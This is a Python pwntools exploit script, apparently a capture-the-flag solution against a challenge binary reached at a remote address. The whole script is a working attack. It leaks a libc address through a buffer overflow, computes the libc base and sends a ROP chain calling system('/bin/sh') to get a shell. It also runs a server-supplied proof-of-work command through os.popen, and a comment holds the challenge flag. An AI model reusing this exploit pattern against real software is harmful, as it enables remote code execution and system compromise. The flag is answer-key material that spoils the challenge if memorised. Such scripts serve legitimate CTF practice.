#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./main")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

sshc = None
r = None
nc = "nc 20.7.158.184 1340"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
        
        r.recvuntil(b"proof of work: ")
        cmd = r.readline().decode().strip()
        poc = os.popen(cmd).read().strip()
        r.sendline(poc)
    
    return r


def main():
    global r
    r = conn()
    
    payload = b"a"*35 + b"b"*5
    payload += b"\x1c"
    
    send(payload)
    
    r.recvuntil(b"b"*5)
    leak = u64(r.readline().strip().ljust(8, b"\0"))
    logh("Leak", leak)
    
    libc_base = leak - 0x23a1c
    logh("libc_base", libc_base)
    
    ret = libc_base + 0x0000000000022fd9
    pop_rdi = libc_base + 0x00000000000240e5
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    system = libc_base + libc.symbols.system
    
    payload = b"a"*40
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(system)
    
    send(payload)

    r.interactive() # hackfest{9599ddf80fe1916e48b8b9bcd6ebc83f01b31311962e9d34a11bf97cc75cfc40}


if __name__ == "__main__":
    main()

